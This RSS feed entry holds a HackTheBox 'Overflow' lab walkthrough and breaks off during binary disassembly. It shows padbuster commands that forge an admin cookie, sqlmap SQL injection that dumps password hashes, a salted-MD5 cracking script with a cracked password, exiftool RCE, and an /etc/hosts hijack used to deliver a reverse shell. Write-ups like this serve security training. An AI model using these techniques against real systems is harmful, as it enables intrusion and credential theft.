<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-04-09T15:37:26+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Overflow - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/overflow.html" rel="alternate" type="text/html" title="Overflow - HackTheBox" /><published>2022-04-09T00:00:00+01:00</published><updated>2022-04-09T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/overflow</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/overflow.html"><![CDATA[<p><strong>Overflow</strong> is an amazing <em>hard</em>-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an <em>oracle padding</em> vulnerability to gain access to an admin dashboard that’s vulnerable to <em>SQL injection</em>, use the <em>SQL injection</em> to retrieve and crack a hash for another domain, which is vulnerable to an <em>exiftool</em> RCE.</p>

<p>There are two local users on the box; one accessible through password reuse, and the other due to a write privilege on an important system file. For privesc, you will be exploiting a classic <em>buffer overflow</em> on a custom binary with a non-excutable (NX) stack.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220216103414.png" alt="" /></p>

<p><img src="/assets/img/20220216103523.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Thu Feb  3 03:04:42 2022 as: nmap -sC -sV -o nmap.txt -v overflow.htb
Nmap scan report for overflow.htb (10.10.11.119)
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=overflow
| Subject Alternative Name: DNS:overflow
| Issuer: commonName=overflow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-17T10:41:37
| Not valid after:  2031-05-15T10:41:37
| MD5:   9bec 0c24 e822 f27b 0e0b be7a 1e42 90ca
|_SHA-1: 4423 a65c ca82 e166 4a7e 1416 d759 111b 36b3 e532
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 03:05:45 2022 -- 1 IP address (1 host up) scanned in 62.96 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/20220216103658.png" alt="" /></p>

<p>There is a contact form at the bottom of the page;</p>

<p><img src="/assets/img/20220216104043.png" alt="" /></p>

<p>Filling and submitting the form generated a GET request to the site’s homepage without any of the parameters, so this is probably just another broken form as commonly seen in HTB boxes.</p>

<p>There is a login page linked at the top of the homepage;</p>

<p><img src="/assets/img/20220216104151.png" alt="" /></p>

<p>This is submitted in a simple POST request with no tokens;</p>

<p><img src="/assets/img/20220216104422.png" alt="" /></p>

<p>Using the registration page, I was able to create an account and login to the site;</p>

<p><img src="/assets/img/20220216104706.png" alt="" /></p>

<p><img src="/assets/img/20220216104830.png" alt="" /></p>

<p>There is nothing of much interest in the site even after login. The <em>blog</em> page linked to from the homepage after login has a few entries, but only the title seems valid. All the links are dead. The titles are: <em>Outdated Softwares</em>, <em>Buffer Overflows</em>, <em>Insecure File Uploads</em>, and <em>SQL Truncation Attacks</em>. This feels like a teaser for what’s about to come.</p>

<p>Looking more closely at the homepage, I noticed a possible username <strong>ajmal</strong>;</p>

<p><img src="/assets/img/20220216110013.png" alt="" /></p>

<p>I tested if this username existed in the website, and it didn’t because I was able to create an account with it. However, the user <strong>admin</strong> may exist in the server because I was unable to register an account with it.</p>

<p>Fuzzing the site for hidden subdomains didn’t yield any;</p>

<p><img src="/assets/img/20220216114327.png" alt="" /></p>

<p><br /></p>

<h4 id="smtp">SMTP</h4>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">nmap</code> scan on the host showed that SMTP is running on port <strong>25</strong>, and that the <code class="language-plaintext highlighter-rouge">vrfy</code> command is available, which could be used to enumerate valid users. The command showed that the user <code class="language-plaintext highlighter-rouge">root</code> exists on the host;</p>

<p><img src="/assets/img/20220216111316.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code>, the following users were enumerated;</p>
<ul>
  <li>www-data</li>
  <li>root</li>
  <li>postfix</li>
  <li>daemon</li>
  <li>MAILER-DAEMON</li>
  <li>list</li>
  <li>news</li>
  <li>nobody</li>
  <li>mail</li>
  <li>postmaster.</li>
</ul>

<p>These are all default user accounts, so nothing interesting.</p>

<p>Using <code class="language-plaintext highlighter-rouge">netcat</code>, I was able to send an email to the root user without any issues;</p>

<p><img src="/assets/img/20220216112314.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="oracle-padding">Oracle Padding</h3>
<p><br /></p>

<p>I was convinced the titles of the blog entries are some sort of hints for solving this box. The only one that applies to the website at this stage is the <em>SQL Truncation attack</em>, so I decided to probe the account registration and login functions, since they are the only ways that let me send some data that is actually processed by the web application.</p>

<p>Fuzzing the login parameters <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> for SQL-related attacks didn’t give me anything. However, the session cookie <code class="language-plaintext highlighter-rouge">auth</code> that is issued after authentication looks interesting because it looks like a URL encoded base64 string;</p>

<p><img src="/assets/img/20220217162110.png" alt="" /></p>

<p>URL-decoding and base64-decoding this, I get some string that appears to be encrypted. So I started fuzzing it manually through burp’s repeater.</p>

<p>When adding a single character to the end of the cookie string, which could be anything, I was able to access the <code class="language-plaintext highlighter-rouge">/home/profile/</code> page which is protected by authentication. If I add more than one character at the end of the cookie, I get a <strong>302</strong> redirect to the login page with the parameter <code class="language-plaintext highlighter-rouge">err=1</code>;</p>

<p><img src="/assets/img/20220217163117.png" alt="" /></p>

<p>Going to the URL, I got an interesting message;</p>

<p><img src="/assets/img/20220217163349.png" alt="" /></p>

<p>It was at this point that I actually realised the web application is vulnerable to <em>Execute After Redirect (EAR)</em> vulnerability because the page is actually returned when making a request without the session cookie;</p>

<p><img src="/assets/img/20220217164012.png" alt="" /></p>

<p>Going back to the cookie, I noticed that adding anything to the begining of the cookie result in an error, with exception of few characters like <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">"</code>, or <code class="language-plaintext highlighter-rouge">+</code>.</p>

<p>I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, but it couldn’t find anything. Testing for SQL truncation attack in the registration function with the aim of creating another account with the username <strong>admin</strong> (which seems to be already registered) didn’t work.</p>

<p>I continue to fuzz the website for hidden paths in hope of finding one I can access due to the EAR flaw. Fuzzing the web root, I found the directory <strong>config</strong>;</p>

<p><img src="/assets/img/20220218055109.png" alt="" /></p>

<p>Fuzzing that directory, I got a few hits;</p>

<p><img src="/assets/img/20220218055219.png" alt="" /></p>

<p>All are just PHP pages, and didn’t give me anything. Bruteforcing the <code class="language-plaintext highlighter-rouge">/home</code> page found a new path <code class="language-plaintext highlighter-rouge">/home/logs.php</code>;</p>

<p><img src="/assets/img/20220218060331.png" alt="" /></p>

<p>Going to the page, I got an <strong>Unauthorized</strong> message. I get this <em>unauthorized</em> message even after logging in with my test account, so this page is probably only accessible by the <strong>admin</strong>.</p>

<p>I was stuck on this for a while, and had to take a sanity check regarding the padding error I was getting when playing with the <code class="language-plaintext highlighter-rouge">auth</code> cookie. I was introduced to <em>Oracle Padding</em> attacks, which is something I’ve never heard before :(</p>

<p>After reading up on such attacks at https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html and some other sites, I was able to decode the cookie issued to my test account using a tool called <code class="language-plaintext highlighter-rouge">padbuster</code> that automate this process.</p>

<p>To use <code class="language-plaintext highlighter-rouge">padbuster</code>, you need to at least supply the target URL, the encrypted string, and the block size. The url in this case is any page that process the cookie, so I chose <code class="language-plaintext highlighter-rouge">/home/profile/</code>. The encrypted string is the cookie value I got after login, and the block size is <strong>8</strong> since the base64-decoded cookie always gives 24 characters, which is a multiple of <strong>8</strong>.</p>

<p>With this info, I was able to decrypt the cookie I was issued using the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>padbuster http://overflow.htb/home/profile/ 6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9 8 <span class="nt">-cookies</span> <span class="s2">"auth=6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It took quite a while, but it worked;</p>

<p><img src="/assets/img/20220218130956.png" alt="" /></p>

<p>Using the command, I was able to craft a cookie with <code class="language-plaintext highlighter-rouge">user=admin</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>padbuster http://overflow.htb/home/profile/ RhNgaMySdgdBgb3N7iuvOM25sELhCZ72 8 <span class="nt">-cookies</span> <span class="s2">"auth=RhNgaMySdgdBgb3N7iuvOM25sELhCZ72"</span> <span class="nt">-plaintext</span> <span class="s2">"user=admin"</span> <span class="nt">-verbose</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220219081330.png" alt="" /></p>

<p>Loading the homepage using this cookie, I noticed two new links in the homepage;</p>

<p><img src="/assets/img/20220219081749.png" alt="" /></p>

<p>Clicking on <code class="language-plaintext highlighter-rouge">Logs</code> just gave me a little popup;</p>

<p><img src="/assets/img/20220219081834.png" alt="" /></p>

<p>Clicking the <code class="language-plaintext highlighter-rouge">Admin panel</code>, I was presented with a login form;</p>

<p><img src="/assets/img/20220219082100.png" alt="" /></p>

<p>Trying some common defaults for the login didn’t work. Checking burp to see how the <code class="language-plaintext highlighter-rouge">/home/logs.php</code> works, I noticed that it passes a GET parameter <code class="language-plaintext highlighter-rouge">name</code> with the value set to <code class="language-plaintext highlighter-rouge">admin</code>. Adding a single quote to test for <em>SQL Injection</em> gave a <strong>500 Internal Server Error</strong>. So I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, and it turns out to be vulnerable;</p>

<p><img src="/assets/img/20220219084125.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="sql-injection">SQL Injection</h3>
<p><br /></p>

<p>Available databases;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>[*] cmsmsdb
[*] information_schema
[*] logs
[*] Overflow
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Tables for <code class="language-plaintext highlighter-rouge">cmsmsdb</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>Database: cmsmsdb
[47 tables]
+-----------------------------+
| cms_additional_users        |
---[snip]---
| cms_user_groups             |
| cms_userplugins             |
| cms_userplugins_seq         |
| cms_userprefs               |
| cms_users                   |
| cms_users_seq               |
| cms_version                 |
+-----------------------------+
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The table <code class="language-plaintext highlighter-rouge">cms_users</code> contains two hashes;</p>

<table>
  <thead>
    <tr>
      <th>EMAIL</th>
      <th>USERNAME</th>
      <th>PASSWORD</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>admin@overflow.htb</td>
      <td>admin</td>
      <td>c6c6b9310e0e6f3eb3ffeb2baff12fdd</td>
    </tr>
    <tr>
      <td> </td>
      <td>editor</td>
      <td>e3d748d58b58657bfa4dffe2def0b1c7</td>
    </tr>
  </tbody>
</table>

<p>Feeding these 2 hashes to <code class="language-plaintext highlighter-rouge">john</code>, I was unable to crack any using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>. This is probably just a rabbit hole, or the hashes could be salted. So I tried using the <code class="language-plaintext highlighter-rouge">--file-read</code> flag of <code class="language-plaintext highlighter-rouge">sqlmap</code> to see if I can read local files, and I couldn’t.</p>

<p>I dumped the whole database using <code class="language-plaintext highlighter-rouge">sqlmap</code> and start going through the records locally in hope of finding something. Searching for the domain name in the records dumped by <code class="language-plaintext highlighter-rouge">sqlmap</code>, I found one;</p>

<p><img src="/assets/img/20220219114511.png" alt="" /></p>

<p>Going to the page, I got another login form;</p>

<p><img src="/assets/img/20220219114720.png" alt="" /></p>

<p>After a lot of digging, I found a hex-encoded string that could be a salt in the table <code class="language-plaintext highlighter-rouge">cms_siteprefs</code>(<em>mask</em> is another name for a salt);</p>

<p><img src="/assets/img/20220219115141.png" alt="" /></p>

<p>I was unable to get <code class="language-plaintext highlighter-rouge">john</code> to work with the hash, so I wrote a simple script;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>


<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Usage: %s &lt;hash&gt; &lt;salt&gt; &lt;wordlist&gt;"</span> <span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">wordlist</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">wordlist</span><span class="p">):</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Invalid wordlist: "</span> <span class="o">+</span> <span class="n">wordlist</span><span class="p">)</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[*] Bruteforcing hash..."</span><span class="p">);</span>
<span class="nb">hash</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">salt</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="n">word</span> <span class="o">=</span> <span class="n">wordlist</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="n">word</span><span class="p">:</span> <span class="c1"># Wordlist exhausted.
</span>    <span class="k">break</span>
  <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
  <span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">salt</span> <span class="o">+</span> <span class="n">word</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="nb">hash</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Success: "</span> <span class="o">+</span> <span class="n">word</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[-] Unable to crack!"</span><span class="p">)</span>
<span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I saved the above as <code class="language-plaintext highlighter-rouge">md5-salt-brute.py</code>, and ran it. I was able to crack the hash of the user <strong>editor</strong>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span><span class="nb">cat </span>hashes.john    
admin:c6c6b9310e0e6f3eb3ffeb2baff12fdd   
editor:e3d748d58b58657bfa4dffe2def0b1c7
admin<span class="o">(</span>overflow<span class="o">)</span>:c71d60439ed5590b3c5e99d95ed48165
agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py c6c6b9310e0e6f3eb3ffeb2baff12fdd 6c2d17f37e226486 /wordlists/rockyou.txt                                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...                   
<span class="o">[</span>-] Unable to crack!                
agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py e3d748d58b58657bfa4dffe2def0b1c7 6c2d17f37e226486 /wordlists/rockyou.txt                                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...        
<span class="o">[</span>+] Success: alpha!@#<span class="nv">$%</span>bravo                 
agent47@debian:<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is the only hash I could crack, but it gave me access to <strong>devbuild-job.overflow.htb</strong>;</p>

<p><img src="/assets/img/20220219124740.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="devbuild-joboverflowhtb">devbuild-job.overflow.htb</h3>
<p><br /></p>

<p>Almost all the links in the dashboard are dead. The profile page has a form that allows users to upload a <em>resume</em>;</p>

<p><img src="/assets/img/20220223084146.png" alt="" /></p>

<p>Uploading a .png file, which is not part of the listed formats, gave a <strong>File Type Not supported</strong> error that appeared only briefly.</p>

<p>Playing with the request in burp’s repeater, I found out the web application may be depending on the file extension for validation, as changing the upload file name of a .png file succeeded, and showed what looks like an output of <code class="language-plaintext highlighter-rouge">exiftool</code>, along with the path the files are uploaded to;</p>

<p><img src="/assets/img/20220223085028.png" alt="" /></p>

<p>Exiftool has an RCE vulnerability tracked as <strong>CVE-2021-22204</strong>, and there is a PoC in the GitHub repo https://github.com/convisolabs/CVE-2021-22204-exiftool. Using it, I was able to spawn a shell on the box as <strong>www-data</strong>;</p>

<p><img src="/assets/img/20220223085941.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Inside the box as <strong>www-data</strong>, I found two local users; <strong>developer</strong>, and <strong>tester</strong>. The user <strong>tester</strong> is the one that hold the user flag. The configuration files of the site <strong>devbuild-job.overflow.htb</strong> has a MySQL credential;</p>

<p><img src="/assets/img/20220223090438.png" alt="" /></p>

<p>The password is not reused by any of the local users. The main site <strong>overflow.htb</strong> also has a MySQL credential;</p>

<p><img src="/assets/img/20220223090806.png" alt="" /></p>

<p>Testing this password against the local user account of <strong>developer</strong> worked, and I was able to login over SSH;</p>

<p><img src="/assets/img/20220223091047.png" alt="" /></p>

<p><br /></p>

<h4 id="developer">Developer</h4>
<p><br /></p>

<p>The user does not have any <code class="language-plaintext highlighter-rouge">sudo</code> permissions, but they belong to a group called <strong>network</strong>. Searching for files that belong to this group, I got one very interesting match;</p>

<p><img src="/assets/img/20220223092838.png" alt="" /></p>

<p>I have write permissions on a very important file. If I can find any service that’s making some requests to a hostname, I can edit the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so that the hostname resolves to an address I control.</p>

<p>So I uploaded <code class="language-plaintext highlighter-rouge">pspy</code> to the box, and it picked up a download using <code class="language-plaintext highlighter-rouge">curl</code> for a shell script on the site <strong>taskmanage.overflow.htb</strong>;</p>

<p><img src="/assets/img/20220223094110.png" alt="" /></p>

<p>So I created a file named <code class="language-plaintext highlighter-rouge">task.sh</code> with a reverse shell payload on my box, and hosted it using python’s <code class="language-plaintext highlighter-rouge">http.server</code> module. I then edited the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file on the box and mapped the domain <strong>taskmanage.overflow.htb</strong> to my IP;</p>

<p><img src="/assets/img/20220223094534.png" alt="" /></p>

<p>After a few seconds, the file was downloaded from my attack box, and executed, which gave me access to the box as <strong>tester</strong>;</p>

<p><img src="/assets/img/20220223094835.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>I cannot view <code class="language-plaintext highlighter-rouge">sudo</code> permission for the user <strong>tester</strong> as I still don’t have their password, and the user does not belong to any other group.</p>

<p>Going through the filesystem, I found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt</code>;</p>

<p><img src="/assets/img/20220223095648.png" alt="" /></p>

<p>Running the binary, I was prompted for a PIN;</p>

<p><img src="/assets/img/20220223095808.png" alt="" /></p>

<p>So I shipped the binary to my attack box for analysis.</p>

<p><br /></p>

<h4 id="analysis-file_encrypt">Analysis: file_encrypt</h4>
<p><br /></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span>rabin2 <span class="nt">-I</span> file_encrypt 
<span class="nb">arch     </span>x86
baddr    0x0
binsz    10741
bintype  elf
bits     32
canary   <span class="nb">false
</span>class    ELF32
compiler GCC: <span class="o">(</span>Ubuntu 7.5.0-3ubuntu1~18.04<span class="o">)</span> 7.5.0
crypto   <span class="nb">false
</span>endian   little
havecode <span class="nb">true
</span>intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  <span class="nb">true
</span>lsyms    <span class="nb">true
</span>machine  Intel 80386
nx       <span class="nb">true
</span>os       linux
pic      <span class="nb">true
</span>relocs   <span class="nb">true
</span>relro    full
rpath    NONE
sanitize <span class="nb">false
</span>static   <span class="nb">false
</span>stripped <span class="nb">false
</span>subsys   linux
va       <span class="nb">true</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">main</code> function is calling <code class="language-plaintext highlighter-rouge">check_pin()</code>, which is likely the function doing PIN validation;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>[0x00000b62]&gt; pdf
╭ 46: int main (char **argv);
│           ; arg char **argv @ esp+0x14
│           0x00000b62      8d4c2404       lea ecx, [argv]
│           0x00000b66      83e4f0         and esp, 0xfffffff0
│           0x00000b69      ff71fc         push dword [ecx - 4]
│           0x00000b6c      55             push ebp
│           0x00000b6d      89e5           mov ebp, esp
│           0x00000b6f      51             push ecx
│           0x00000b70      83ec04         sub esp, 4
│           0x00000b73      e818000000     call sym.__x86.get_pc_thunk.ax
│           0x00000b78      0528240000     add eax, 0x2428
│           0x00000b7d      e82effffff     call sym.check_pin
│           0x00000b82      b800000000     mov eax, 0
│           0x00000b87      83c404         add esp, 4
│           0x00000b8a      59             pop ecx
│           0x00000b8b      5d             pop ebp
│           0x00000b8c      8d61fc         lea esp, [ecx - 4]
╰           0x00000b8f      c3             ret
[0x00000b62]&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Disassembly of <code class="language-plaintext highlighter-rouge">sym.check_pin</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre></td><td class="rouge-code"><pre>[0x56602ab0]&gt; pdf                                                                                                                     
            ; CALL XREF from main @ 0x56602b7d
╭ 178: sym.check_pin ();
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_14h @ ebp-0x14                                                                                          
│           ; var uint32_t var_10h @ ebp-0x10                                                                                         
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           0x56602ab0      55             push ebp
│           0x56602ab1      89e5           mov ebp, esp
│           0x56602ab3      53             push ebx
│           0x56602ab4      83ec24         sub esp, 0x24                                                                              
│           0x56602ab7      e864fcffff     call sym.__x86.get_pc_thunk.bx                                                             
│           0x56602abc      81c3e4240000   add ebx, 0x24e4
│           0x56602ac2      e8e9fbffff     call sym.imp.rand           ; int rand(void)                                               
│           0x56602ac7      8945f4         mov dword [ebp - 0xc], eax                                                                 
│           0x56602aca      83ec0c         sub esp, 0xc                                                                               
│           0x56602acd      ff75f4         push dword [ebp - 0xc]                                                                     
│           0x56602ad0      e848fdffff     call sym.random             ; uint32_t random(void)                                        
│           0x56602ad5      83c410         add esp, 0x10
│           0x56602ad8      8945f0         mov dword [ebp - 0x10], eax                                                                
│           0x56602adb      83ec08         sub esp, 8
│           0x56602ade      ff75f4         push dword [ebp - 0xc]
│           0x56602ae1      8d8358ddffff   lea eax, [ebx - 0x22a8]                                                                    
│           0x56602ae7      50             push eax                    ; const char *format                                           
│           0x56602ae8      e8f3faffff     call sym.imp.printf         ; int printf(const char *format)                               
│           0x56602aed      83c410         add esp, 0x10
│           0x56602af0      83ec08         sub esp, 8
│           0x56602af3      8d45ec         lea eax, [ebp - 0x14]
│           0x56602af6      50             push eax
│           0x56602af7      8d837dddffff   lea eax, [ebx - 0x2283]
│           0x56602afd      50             push eax                    ; const char *format
│           0x56602afe      e8bdfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x56602b03      83c410         add esp, 0x10
│           0x56602b06      8b45ec         mov eax, dword [ebp - 0x14]
│           0x56602b09      3945f0         cmp dword [ebp - 0x10], eax
│       ╭─&lt; 0x56602b0c      753c           jne 0x56602b4a
│       │   0x56602b0e      83ec0c         sub esp, 0xc
│       │   0x56602b11      8d8380ddffff   lea eax, [ebx - 0x2280]
│       │   0x56602b17      50             push eax                    ; const char *format
│       │   0x56602b18      e8c3faffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x56602b1d      83c410         add esp, 0x10
│       │   0x56602b20      83ec08         sub esp, 8
│       │   0x56602b23      8d45d8         lea eax, [ebp - 0x28]
│       │   0x56602b26      50             push eax
│       │   0x56602b27      8d83c3dcffff   lea eax, [ebx - 0x233d]
│       │   0x56602b2d      50             push eax                    ; const char *format
│       │   0x56602b2e      e88dfbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│       │   0x56602b33      83c410         add esp, 0x10
│       │   0x56602b36      83ec0c         sub esp, 0xc
│       │   0x56602b39      8d8388ddffff   lea eax, [ebx - 0x2278]
│       │   0x56602b3f      50             push eax                    ; const char *s
│       │   0x56602b40      e8fbfaffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x56602b45      83c410         add esp, 0x10
│      ╭──&lt; 0x56602b48      eb12           jmp 0x56602b5c
│      ││   ; CODE XREF from sym.check_pin @ 0x56602b0c
│      │╰─&gt; 0x56602b4a      83ec0c         sub esp, 0xc
│      │    0x56602b4d      8d83e3ddffff   lea eax, [ebx - 0x221d]
│      │    0x56602b53      50             push eax                    ; const char *s
│      │    0x56602b54      e8e7faffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x56602b59      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.check_pin @ 0x56602b48
